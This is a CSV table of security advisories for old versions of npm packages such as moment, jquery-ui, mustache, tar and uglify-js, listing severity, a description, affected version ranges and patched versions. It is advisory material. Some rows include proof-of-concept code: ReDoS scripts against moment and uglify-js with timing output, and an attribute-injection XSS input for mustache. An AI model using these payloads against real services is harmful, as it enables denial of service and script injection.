CVE,package,severity,summary,description,publishedAt,vulnerableVersionRange,firstPatchedVersion
CVE-2017-1000006,plotly.js,MODERATE,Cross Site Scripting (XSS) in plotly.js,"Affected versions of `plotly.js` are vulnerable to cross-site scripting if an attacker can convince a user to visit a malicious plot on a site using this package.


## Recommendation

Update to 1.16.0 or later.",2017-10-24T18:33:35Z,< 1.16.0,1.16.0
CVE-2016-7103,jquery-ui,HIGH,XSS in dialog closeText in jquery-ui,"Affected versions of `jquery-ui` are vulnerable to a cross-site scripting vulnerability when arbitrary user input is supplied as the value of the `closeText` parameter in the `dialog` function. 

jQuery-UI is a library for manipulating UI elements via jQuery.

Version 1.11.4 has a cross site scripting (XSS) vulnerability in the `closeText` parameter of the `dialog`  function.  If your application passes user input to this parameter, it may be vulnerable to XSS via this attack vector.


## Recommendation

Upgrade to jQuery-UI 1.12.0 or later.",2017-10-24T18:33:35Z,< 1.12.0,1.12.0
CVE-2016-4055,moment,MODERATE,Regular Expression Denial of Service in moment,"Versions of `moment` prior to 2.11.2 are affected by a regular expression denial of service vulnerability. The vulnerability is triggered when arbitrary user input is passed into `moment.duration()`.


## Proof of concept
```
var moment = require('moment');

var genstr = function (len, chr) {
    var result = """";
    for (i=0; i<=len; i++) {
        result = result + chr;
    }

    return result;
}


for (i=20000;i<=10000000;i=i+10000) {
    console.log(""COUNT: "" + i);
    var str = '-' + genstr(i, '1')
    console.log(""LENGTH: "" + str.length);
    var start = process.hrtime();
    moment.duration(str)

    var end = process.hrtime(start);
    console.log(end);
}
```

### Results
```
$ node moment.js
COUNT: 20000
LENGTH: 20002
[ 0, 618931029 ]
COUNT: 30001
LENGTH: 30003
[ 1, 401413894 ]
COUNT: 40002
LENGTH: 40004
[ 2, 437075303 ]
COUNT: 50003
LENGTH: 50005
[ 3, 824664804 ]
COUNT: 60004
LENGTH: 60006
[ 5, 651335262 ]
```


## Recommendation

Please update to version 2.11.2 or later. ",2017-10-24T18:33:35Z,< 2.11.2,2.11.2
CVE-2016-1202,electron,HIGH,High severity vulnerability that affects electron,Untrusted search path vulnerability in Atom Electron before 0.33.5 allows local users to gain privileges via a Trojan horse Node.js module in a parent directory of a directory named on a require line.,2017-10-24T18:33:35Z,< 0.33.5,0.33.5
CVE-2015-8862,mustache,HIGH,Cross-Site Scripting in mustache,"Versions of `mustache` prior to 2.2.1 are affected by a cross-site scripting vulnerability when attributes in mustache templates are not quoted.



### Example
Template:
```<a href={{foo}}/>```

Input:
```{ 'foo' : 'test.com onload=alert(1)'}```

Rendered result:
```<a href=test.com onload=alert(1)/>```


## Recommendation

Update to version 2.2.1 or later.
Alternatively, ensure that all attributes in hmustache templates are encapsulated with quotes.",2017-10-24T18:33:36Z,< 2.2.1,2.2.1
CVE-2015-8861,handlebars,MODERATE,Moderate severity vulnerability that affects handlebars,**Withdrawn:** Duplicate of GHSA-9prh-257w-9277,2017-10-24T18:33:36Z,< 4.0.0,4.0.0
CVE-2015-8860,tar,CRITICAL,Symlink Arbitrary File Overwrite in tar,"Versions of `tar` prior to 2.0.0 are affected by an arbitrary file write vulnerability. The vulnerability occurs because `tar` does not verify that extracted symbolic links to not resolve to targets outside of the extraction root directory.



## Recommendation

Update to version 2.0.0 or later",2017-10-24T18:33:36Z,< 2.0.0,2.0.0
CVE-2015-8859,send,LOW,Root Path Disclosure in send,"Versions of `send` prior to 0.11.2 are affected by an information leakage vulnerability which may allow an attacker to enumerate paths on the server filesystem.



## Recommendation

Update to version 0.11.1 or later.",2017-10-24T18:33:36Z,< 0.11.1,0.11.1
CVE-2015-8858,uglify-js,LOW,Regular Expression Denial of Service in uglify-js,"Versions of `uglify-js` prior to 2.6.0 are affected by a regular expression denial of service vulnerability when malicious inputs are passed into the `parse()` method.


### Proof of Concept

```
var u = require('uglify-js');
var genstr = function (len, chr) {
    var result = """";
    for (i=0; i<=len; i++) {
        result = result + chr;
    }

    return result;
}

u.parse(""var a = "" + genstr(process.argv[2], ""1"") + "".1ee7;"");
```

### Results
```
$ time node test.js 10000
real	0m1.091s
user	0m1.047s
sys	0m0.039s

$ time node test.js 80000
real	0m6.486s
user	0m6.229s
sys	0m0.094s
```


## Recommendation

Update to version 2.6.0 or later.",2017-10-24T18:33:36Z,< 2.6.0,2.6.0
CVE-2015-8857,uglify-js,LOW,Incorrect Handling of Non-Boolean Comparisons During Minification in uglify-js,"Versions of `uglify-js` prior to 2.4.24 are affected by a vulnerability which may cause crafted JavaScript to have altered functionality after minification.




## Recommendation

Upgrade UglifyJS to version >= 2.4.24.",2017-10-24T18:33:36Z,< 2.4.24,2.4.24
